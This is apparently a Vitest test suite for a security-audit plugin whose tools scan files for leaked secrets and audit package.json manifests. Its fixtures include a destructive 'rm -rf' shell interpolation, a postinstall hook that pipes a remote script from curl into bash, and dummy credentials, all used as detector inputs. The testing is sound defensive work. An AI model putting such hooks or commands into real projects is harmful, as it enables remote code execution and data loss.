import { describe, expect, it } from 'vitest'
import { apply, Config, inject, name } from '../src/index.ts'
import type { Config as PluginConfig } from '../src/index.ts'

interface TextBlock { type: string; text: string }

interface RegisteredTool {
  name: string
  description: string
  parameters: Record<string, { type: string; required?: boolean }>
  output: { schema: Record<string, unknown>; render(args: never, value: never): TextBlock[] }
  isConcurrencySafe?(args: never): boolean
  execute(args: never, exec: never): Promise<unknown>
}

const BASE_CONFIG: PluginConfig = {
  maxBytes: 262144,
  maxFindings: 200,
  disabledRules: [],
  includeDevDependencies: true,
  extraRiskyPackages: [],
}

/** Mount the plugin against a stub registry and return what it registered. */
function mountPlugin(overrides: Partial<PluginConfig> = {}): RegisteredTool[] {
  const registered: RegisteredTool[] = []
  const ctx = { tools: { register: (def: RegisteredTool) => registered.push(def) } }
  // The plugin only reads ctx.tools, so this stub is the whole surface it touches.
  apply(ctx as never, { ...BASE_CONFIG, ...overrides } as never)
  return registered
}

function tool(toolName: string, overrides: Partial<PluginConfig> = {}): RegisteredTool {
  const found = mountPlugin(overrides).find(entry => entry.name === toolName)
  if (!found) throw new Error(`${toolName} was not registered`)
  return found
}

interface ScanResult {
  scanned: number
  counts: { high: number; medium: number; low: number }
  truncated: boolean
  findings: Array<{ rule: string; kind: string; severity: string; path: string; line: number; evidence: string; message: string }>
  skipped: Array<{ path: string; reason: string }>
}

interface AuditResult {
  ok: boolean
  error: string
  pkg: string
  dependencyCount: number
  counts: { high: number; medium: number; low: number }
  findings: Array<{ rule: string; severity: string; pkg: string; range: string; message: string }>
}

const LEAKY = [
  'export const aws = { id: "AKIAIOSFODNN7EXAMPLE" }',
  'const password = "hunter2hunter2"',
  '-----BEGIN RSA PRIVATE KEY-----',
  'child_process.execSync(`rm -rf ${target}`)',
  'export default { port: 3000 }',
].join('\n')

async function runScan(files: Record<string, unknown>, maxBytes: number, overrides: Partial<PluginConfig> = {}): Promise<ScanResult> {
  return await tool('scan_secrets', overrides).execute({ files, maxBytes } as never, {} as never) as ScanResult
}

async function runAudit(packageJsonText: string, includeDev: boolean, overrides: Partial<PluginConfig> = {}): Promise<AuditResult> {
  return await tool('audit_package', overrides).execute({ packageJsonText, includeDev } as never, {} as never) as AuditResult
}

describe('dsh-security-audit plugin contract', () => {
  it('exports the loader plugin face', () => {
    expect(name).toBe('dsh-security-audit')
    expect(inject).toEqual(['tools'])
    expect(typeof apply).toBe('function')
    expect(Config).toBeInstanceOf(Object)
  })

  it('supplies the documented configuration defaults', () => {
    expect(Config({})).toEqual({
      maxBytes: 262144,
      maxFindings: 200,
      disabledRules: [],
      extraRiskyPackages: [],
      includeDevDependencies: false,
    })
    expect(Config({ maxBytes: 1024, extraRiskyPackages: ['@evil'] })).toMatchObject({
      maxBytes: 1024,
      extraRiskyPackages: ['@evil'],
    })
  })

  it('honours disabledRules by dropping that signature from scan_secrets', async () => {
    const files = { 'src/index.js': LEAKY }
    const withAws = await runScan(files, 0)
    expect(withAws.findings.some(f => f.rule === 'aws-access-key-id')).toBe(true)
    const without = await runScan(files, 0, { disabledRules: ['aws-access-key-id'] })
    expect(without.findings.some(f => f.rule === 'aws-access-key-id')).toBe(false)
    expect(without.findings.length).toBeLessThan(withAws.findings.length)
  })

  it('registers the two documented tools, pure and concurrency-safe', () => {
    const tools = mountPlugin()
    expect(tools.map(t => t.name).sort()).toEqual(['audit_package', 'scan_secrets'])
    for (const entry of tools) {
      expect(typeof entry.execute).toBe('function')
      expect(typeof entry.output.render).toBe('function')
      expect(typeof entry.isConcurrencySafe).toBe('function')
      expect(entry.description.length).toBeGreaterThan(60)
    }
    expect(tools[0]!.isConcurrencySafe!({ files: {}, maxBytes: 0 } as never)).toBe(true)
  })
})

describe('scan_secrets', () => {
  it('finds credential and risky-pattern signatures with line numbers', async () => {
    const result = await runScan({ 'src/config.ts': LEAKY }, 262144)
    const rules = result.findings.map(f => f.rule)
    expect(result.scanned).toBe(1)
    expect(rules).toContain('aws-access-key-id')
    expect(rules).toContain('private-key-block')
    expect(rules).toContain('generic-secret-assignment')
    expect(rules).toContain('interpolated-shell-command')
    const aws = result.findings.find(f => f.rule === 'aws-access-key-id')!
    expect(aws.line).toBe(1)
    expect(aws.kind).toBe('secret')
    expect(aws.severity).toBe('high')
    expect(result.findings.find(f => f.rule === 'private-key-block')!.line).toBe(3)
    expect(result.counts.high).toBeGreaterThanOrEqual(3)
    expect(result.truncated).toBe(false)
    expect(result.skipped).toEqual([])
  })

  it('redacts credential evidence instead of echoing it back', async () => {
    const result = await runScan({ 'src/config.ts': LEAKY }, 262144)
    const dump = JSON.stringify(result.findings)
    expect(dump).not.toContain('AKIAIOSFODNN7EXAMPLE')
    expect(dump).not.toContain('hunter2hunter2')
    expect(result.findings.find(f => f.rule === 'aws-access-key-id')!.evidence).toContain('AKIAIO')
    expect(result.findings.find(f => f.rule === 'aws-access-key-id')!.evidence).toContain('*')
  })

  it('leaves clean files alone', async () => {
    const result = await runScan({
      'src/clean.ts': 'export function add(a: number, b: number): number {\n  return a + b\n}\n',
    }, 262144)
    expect(result.findings).toEqual([])
    expect(result.scanned).toBe(1)
    expect(result.counts).toEqual({ high: 0, medium: 0, low: 0 })
  })

  it('skips oversized, binary, and non-string entries instead of failing', async () => {
    const result = await runScan({
      'big.js': `const key = "AKIAIOSFODNN7EXAMPLE"\n${'x'.repeat(500)}`,
      'asset.bin': 'prefix\u0000suffix',
      'nested.json': { unexpected: true },
    }, 32)
    expect(result.scanned).toBe(0)
    expect(result.findings).toEqual([])
    expect(result.skipped.map(s => s.path).sort()).toEqual(['asset.bin', 'big.js', 'nested.json'])
    expect(result.skipped.find(s => s.path === 'big.js')!.reason).toContain('exceeds the 32 byte budget')
    expect(result.skipped.find(s => s.path === 'asset.bin')!.reason).toBe('binary content')
    expect(result.skipped.find(s => s.path === 'nested.json')!.reason).toBe('content is not a string')
  })

  it('honours the configured report cap and still counts everything', async () => {
    const result = await runScan({ 'a.ts': LEAKY, 'b.ts': LEAKY }, 0, { maxFindings: 2 })
    expect(result.findings).toHaveLength(2)
    expect(result.truncated).toBe(true)
    expect(result.counts.high + result.counts.medium + result.counts.low).toBeGreaterThan(2)
    expect(result.scanned).toBe(2)
  })

  it('renders a text summary for the transcript', async () => {
    const entry = tool('scan_secrets')
    const result = await runScan({ 'src/config.ts': LEAKY }, 262144)
    const blocks = entry.output.render({ files: {}, maxBytes: 262144 } as never, result as never)
    expect(blocks[0]!.type).toBe('text')
    expect(blocks[0]!.text).toContain('scan_secrets:')
    expect(blocks[0]!.text).toContain('aws-access-key-id')
  })
})

describe('audit_package', () => {
  const RISKY_MANIFEST = JSON.stringify({
    name: 'demo-app',
    dependencies: {
      'event-stream': '^3.3.4',
      lodahs: '4.17.21',
      'my-lib': 'git+https://github.com/example/my-lib.git',
      insecure: 'http://registry.example.com/insecure.tgz',
    },
    devDependencies: { whatever: '*' },
    scripts: {
      build: 'tsc',
      postinstall: 'curl -sSf https://build.example.xyz/install.sh | bash',
    },
  }, null, 2)

  it('flags known-risky packages, typosquats, volatile sources, and install hooks', async () => {
    const result = await runAudit(RISKY_MANIFEST, true)
    const rules = result.findings.map(f => f.rule)
    expect(result.ok).toBe(true)
    expect(result.error).toBe('')
    expect(result.pkg).toBe('demo-app')
    expect(result.dependencyCount).toBe(5)
    expect(rules).toContain('known-risky-package')
    expect(rules).toContain('possible-typosquat')
    expect(rules).toContain('git-dependency')
    expect(rules).toContain('insecure-dependency-url')
    expect(rules).toContain('unpinned-range')
    expect(rules).toContain('install-time-hook')
    expect(rules).toContain('curl-piped-to-shell')
    expect(result.findings[0]!.severity).toBe('high')
    expect(result.findings.find(f => f.pkg === 'lodahs')!.message).toContain('lodash')
    expect(result.counts.high).toBeGreaterThanOrEqual(3)
  })

  it('reports an unparsable manifest instead of throwing', async () => {
    const result = await runAudit('{ "name": "broken", ', true)
    expect(result.ok).toBe(false)
    expect(result.error.length).toBeGreaterThan(0)
    expect(result.findings).toEqual([])
    expect(result.dependencyCount).toBe(0)
    const blocks = tool('audit_package').output.render({ packageJsonText: '', includeDev: true } as never, result as never)
    expect(blocks[0]!.text).toContain('cannot use this manifest')
  })

  it('rejects a non-object JSON root', async () => {
    const result = await runAudit('[1, 2, 3]', true)
    expect(result.ok).toBe(false)
    expect(result.error).toContain('JSON object')
  })

  it('leaves a pinned mainstream manifest clean and can skip devDependencies', async () => {
    const clean = JSON.stringify({
      name: 'quiet',
      dependencies: { react: '^18.2.0', zod: '3.22.4' },
      devDependencies: { 'event-stream': '3.3.4' },
    })
    expect((await runAudit(clean, true)).findings.map(f => f.pkg)).toContain('event-stream')
    const withoutDev = await runAudit(clean, false)
    expect(withoutDev.findings).toEqual([])
    expect(withoutDev.dependencyCount).toBe(2)
    expect(withoutDev.counts).toEqual({ high: 0, medium: 0, low: 0 })
  })

  it('applies the deployment blocklist from config', async () => {
    const manifest = JSON.stringify({ name: 'corp', dependencies: { '@evil/loader': '1.0.0' } })
    expect((await runAudit(manifest, true)).findings.map(f => f.rule)).not.toContain('blocklisted-package')
    const blocked = await runAudit(manifest, true, { extraRiskyPackages: ['@evil'] })
    const hit = blocked.findings.find(f => f.rule === 'blocklisted-package')
    expect(hit).toBeDefined()
    expect(hit!.severity).toBe('high')
    expect(hit!.message).toContain('@evil')
  })

  it('flags forced overrides and flattens nested override blocks', async () => {
    const result = await runAudit(JSON.stringify({
      name: 'overrider',
      dependencies: { axios: '^1.6.0' },
      overrides: { axios: { 'form-data': '2.3.3-snyk' } },
    }), true)
    const override = result.findings.find(f => f.rule === 'version-override')
    expect(override).toBeDefined()
    expect(override!.pkg).toBe('axios > form-data')
    expect(result.findings.find(f => f.rule === 'possible-typosquat' && f.pkg === '2.3.3-snyk')).toBeUndefined()
  })

  it('renders the audit as text', async () => {
    const result = await runAudit(RISKY_MANIFEST, true)
    const blocks = tool('audit_package').output.render({ packageJsonText: RISKY_MANIFEST, includeDev: true } as never, result as never)
    expect(blocks[0]!.type).toBe('text')
    expect(blocks[0]!.text).toContain('demo-app')
    expect(blocks[0]!.text).toContain('known-risky-package')
  })
})
